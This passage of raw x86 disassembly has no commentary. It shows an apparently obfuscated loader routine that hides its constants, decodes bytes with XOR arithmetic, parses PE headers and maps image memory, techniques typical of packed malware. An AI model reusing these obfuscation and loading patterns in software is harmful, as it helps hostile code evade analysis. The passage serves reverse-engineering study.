  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
